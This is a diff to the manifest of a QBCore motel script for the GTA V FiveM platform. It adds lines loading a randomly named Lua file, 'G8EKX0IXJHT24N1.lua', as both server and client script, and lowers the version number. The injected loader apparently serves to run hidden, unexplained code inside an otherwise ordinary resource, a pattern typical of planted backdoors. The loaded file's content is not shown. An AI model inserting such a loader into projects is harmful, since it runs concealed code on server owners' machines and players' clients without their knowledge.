@@ -1,3 +1,5 @@
+server_script "G8EKX0IXJHT24N1.lua"
+client_script "G8EKX0IXJHT24N1.lua"
 fx_version 'cerulean'
 
 game 'gta5'
@@ -6,7 +8,7 @@ author 'JustLazzy'
 
 description 'Motel script for QBCore'
 
-version '2.5.2'
+version '2.5.0'
 
 client_scripts {
     'client/framework.lua',
